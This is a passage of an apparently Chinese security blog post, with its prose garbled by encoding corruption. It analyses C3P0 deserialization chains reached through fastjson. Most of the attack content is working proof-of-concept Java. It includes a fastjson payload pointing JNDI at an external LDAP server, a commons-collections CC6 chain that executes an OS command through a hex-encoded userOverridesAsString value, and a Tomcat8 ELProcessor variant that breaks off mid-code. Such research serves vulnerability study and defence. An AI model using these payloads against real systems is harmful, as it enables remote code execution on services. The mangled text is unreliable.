src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746291825-b27c8c84-a0a4-4987-b88e-de3892bb1df2.png"></p><p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯è¯¥ç±»çš„inneræ–¹æ³•ï¼Œç»§ç»­çœ‹åœ¨å“ªè°ƒç”¨äº†è¯¥inneræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746347612-80d0badd-c1c7-4fa6-b7a0-98a234e472a1.png"></p><p>æœ‰å¥½å¤šä¸ªè¿™é‡Œå¯ä»¥åˆ©ç”¨çš„æ˜¯setLoginTimeoutæ–¹æ³•ã€‚ä»–æ¥å—ä¸€ä¸ªintç±»å‹çš„ä¼ å‚æ•°ã€‚</p><p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç»“åˆfastjsonè§¦å‘äº†ã€‚æ‰¾ä¸€ä¸‹jndiNameèµ‹å€¼ä¹Ÿæœ‰<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733749699231-57699f34-8167-4127-a3c2-b4c5f6950239.png"></p><p>åœ¨å…¶çˆ¶ç±»é‡Œé¢JndiRefDataSourceBase</p><p>å…¶å®è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªè§¦å‘é“¾æ¡å°±æ˜¯åœ¨è¿™ä¸ªç±»JndiRefConnectionPoolDataSourceä¸­<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748183528-c51e0183-82d1-496f-aed0-b7ba299c1c69.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748201395-6b31303f-9a2c-449d-af4a-712dc5615ee5.png"></p><p>åŒæ—¶æˆ‘ä»¬åœ¨è¿™ä¸ªç±»ä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748244314-03111f56-2ca4-4387-ab9e-7faa11148160.png"></p><p>ä»–æ˜¯è°ƒç”¨äº†com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.javaè¿™ä¸ªç±»ä¸­çš„setLoginTimeoutæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748266853-84887910-587e-42e2-9199-be81311862ae.png"></p><p>çœ‹çœ‹è¿™ä¸ªgetNesteDataSourceæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748309464-474dc855-e8bb-4baa-8d7b-d631ac850fa1.png"></p><p>ç›´æ¥è¿”å›äº†nestedDataSourceå¯¹è±¡å…¶å®è°ƒè¯•ä¼šå‘ç°è¿™ä¸ªå€¼æœ€ç»ˆæ˜¯com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;JndiRefForwardingDataSource.javaè¿™ä¸ªç±»çš„å¯¹è±¡</p><p>æ‰€ä»¥å°±å¯ä»¥é€šè¿‡fastjsonç»“åˆcom&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;JndiRefConnectionPoolDataSource.javaè¿™ä¸ªç±»è¿›è¡Œæ„é€ äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C3P0-ä¹‹-HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»"><a href="#C3P0-ä¹‹-HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»" class="headerlink" title="C3P0 ä¹‹ HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»"></a>C3P0 ä¹‹ HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»</h2><p>æ¼æ´ä¸»è¦å‘ç”Ÿåœ¨WrapperConnectionPoolDataSourceè¿™ä¸ªç±»ä¸­ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755319222-fef10b27-245e-4d75-bc01-fb643f2c3c3d.png"></p><p>çœ‹åˆ°ä»–çš„æ„é€ æ–¹æ³•è°ƒç”¨äº†parseUserOverridesAsStringæ–¹æ³•ä¼ å…¥çš„æ˜¯userOverridesAsStringè¿™ä¸ªå±æ€§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755392004-f2e17934-c4e6-4a48-b556-7503045af6d0.png"></p><p>æ¥ç€æ¥çœ‹çœ‹è¿™ä¸ªæ–¹æ³•å¹²äº†å•¥å¯ä»¥çœ‹åˆ°é¦–å…ˆè¿›è¡Œå­—ç¬¦æˆªå–å°†æœ€åä¸€ä½å’Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755424923-caa297d3-19a0-4fba-898a-4aa0d8e2c09b.png"></p><p>è§£æè¿‡ç¨‹ä¸­è°ƒç”¨äº†substring()æ–¹æ³•å°†å­—ç¬¦ä¸²å¤´éƒ¨çš„<code>HASM_HEADER</code>æˆªå»äº†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ„é€ æ—¶éœ€è¦åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¤´éƒ¨åŠ ä¸Š<code>HASM_HEADER</code>ï¼Œå¹¶ä¸”ä¼šæˆªå»å­—ç¬¦ä¸²æœ€åä¸€ä½ï¼Œæ‰€ä»¥éœ€è¦åœ¨ç»“å°¾åŠ ä¸Šä¸€ä¸ª<code>;</code></p><p>ç„¶åå°†è§£ç çš„æ•°æ®ä¼ å…¥åˆ°SerializableUtils.fromByteArrayæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755545849-e6e31c9e-2baa-4a24-828e-13b6600657b0.png"></p><p>ç»§ç»­è°ƒç”¨ï¼Œç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755563662-2da85cd2-4d93-41d3-8ad3-854765887ebd.png"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨readObjectååºåˆ—åŒ–ã€‚</p><p>ç„¶åæˆ‘ä»¬èƒ½è”æƒ³åˆ°fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•æ‰€ä»¥å»æ‰¾ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755761615-f897c144-2963-46c9-a953-83a3e318dfeb.png"></p><p>åœ¨å…¶çˆ¶ç±»WrapperConnectionPoolDataSourceBaseé‡Œæ‰¾åˆ°äº†setteræ–¹æ³•å¯æ§æ‰€ä»¥å°±å¯ä»¥æ¥ç»“åˆfastjsonæ¥æ„é€ äº†</p><h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Hex</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CC6çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ç‰ˆæœ¬çš„fastjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå…¶å®æ˜¯æœ‰é—®é¢˜çš„æˆ‘ä»¬çš„æµç¨‹ä¸Šæ¥çœ‹ã€‚å°±æ˜¯fastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå…ˆè°ƒç”¨æ„é€ æ–¹æ³•åœ¨å»è°ƒç”¨setter getteræ–¹æ³•é‚£æ—¢ç„¶è¿™æ ·çš„è¯æˆ‘ä»¬çš„setå°±æ²¡æœ‰ç”¨äº†é‚£ä¸ºä»€ä¹ˆè¿˜èƒ½ç»§ç»­è§¦å‘æ¼æ´å‘¢</p><p>å…³é”®ç‚¹åœ¨å…¶çˆ¶ç±»çš„setæ–¹æ³•é‡Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756365687-2bbad0d3-815a-4f71-9f52-c2824c9b5716.png"></p><p>å½“æˆ‘ä»¬è°ƒç”¨è¯¥setteræ—¶ï¼Œé¦–å…ˆä¼šä¸æ—§çš„<code>userOverridesAsString</code>å±æ€§æ¯”è¾ƒï¼Œè¿™é‡Œæ—§å€¼ä¸º<code>null</code>ï¼Œæ–°å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„<code>userOverridesAsString</code>ï¼Œå› æ­¤è¿™é‡Œä¼šè¿›å…¥ifåˆ¤æ–­ã€‚è·Ÿè¿›<code>vcs.fireVetoableChange</code>å®ä¾‹åŒ–äº†ä¸€ä¸ª<code>PropertyChangeEvent</code>å¯¹è±¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756600052-880f1d64-2a8d-4a92-85e8-7fcdeddcfa63.png">ç„¶åè·Ÿè¿›<code>fireVetoableChange(</code>æ–¹æ³•ï¼Œæœ€ååœ¨375è¡Œè¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†<code>WrapperConnectionPoolDataSource#vetoableChange</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756619381-c06e3e30-a22a-4676-b071-4919b99980dc.png"></p><p>è·Ÿè¿›å»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756759849-9929f98e-6583-4165-ad31-f19143eb7d3d.png">å¦‚æœ<code>propName</code>å˜é‡ä¸º<code>userOverridesAsString</code>ï¼Œåˆ™ä¼šç›´æ¥ååºåˆ—åŒ–ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¹¶å°†è¿”å›çš„å¯¹è±¡èµ‹å€¼ç»™<code>userOverrides</code>å±æ€§ã€‚C3P0é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåœ¨setå®Œ<code>userOverridesAsString</code>å±æ€§åç›´æ¥å¯¹å…¶è¿›è¡Œè§£æï¼Œå‡å°‘äº†ä¸€æ¬¡ç±»åˆå§‹åŒ–æ“ä½œã€‚</p><h2 id="c3p0ä¸å‡ºç½‘"><a href="#c3p0ä¸å‡ºç½‘" class="headerlink" title="c3p0ä¸å‡ºç½‘"></a>c3p0ä¸å‡ºç½‘</h2><p>ä¸è®ºæ˜¯URLClassLoaderåŠ è½½è¿œç¨‹ç±»ï¼Œè¿˜æ˜¯JNDIæ³¨å…¥ï¼Œéƒ½éœ€è¦ç›®æ ‡æœºå™¨èƒ½å¤Ÿå‡ºç½‘ã€‚è€ŒåŠ è½½Hexå­—ç¬¦ä¸²çš„æ–¹å¼è™½ç„¶ä¸ç”¨å‡ºç½‘ï¼Œä½†å´æœ‰Fastjsonç­‰çš„ç›¸å…³ä¾èµ–ã€‚é‚£ä¹ˆå¦‚æœç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œåˆæ²¡æœ‰Fastjsonä¾èµ–çš„è¯ï¼ŒC3P0é“¾åˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p><p>åœ¨JNDIé«˜ç‰ˆæœ¬åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŠ è½½æœ¬åœ°çš„Factoryç±»è¿›è¡Œæ”»å‡»ï¼Œè€Œåˆ©ç”¨æ¡ä»¶ä¹‹ä¸€å°±æ˜¯è¯¥å·¥å‚ç±»è‡³å°‘å­˜åœ¨ä¸€ä¸ª<code>getObjectInstance()</code>æ–¹æ³•ã€‚æ¯”å¦‚é€šè¿‡åŠ è½½Tomcat8ä¸­çš„<code>org.apache.naming.factory.BeanFactory</code>è¿›è¡ŒELè¡¨è¾¾å¼æ³¨å…¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733757389442-ba078bd2-ade1-4e11-91ec-13424359baf0.png"></p><p>å¯ä»¥çœ‹åˆ°å’Œjndié«˜ç‰ˆæœ¬ç»•è¿‡å¾ˆåƒå‡è®¾å­˜åœ¨Tomcat8ä¸­çš„<code>org.apache.naming.factory.BeanFactory</code>ã€‚</p><p>å°±å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p><h3 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Tomcat8</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span 